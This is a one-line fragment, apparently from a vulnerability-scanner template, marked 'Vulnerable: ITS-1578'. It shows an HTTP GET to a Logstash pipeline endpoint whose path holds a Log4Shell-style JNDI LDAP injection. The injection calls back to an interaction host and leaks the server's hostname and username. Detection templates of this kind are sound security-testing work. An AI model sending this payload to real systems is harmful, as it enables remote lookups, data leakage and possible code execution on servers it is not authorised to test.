# Vulnerable: ITS-1578
GET /api/logstash/pipeline/${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}
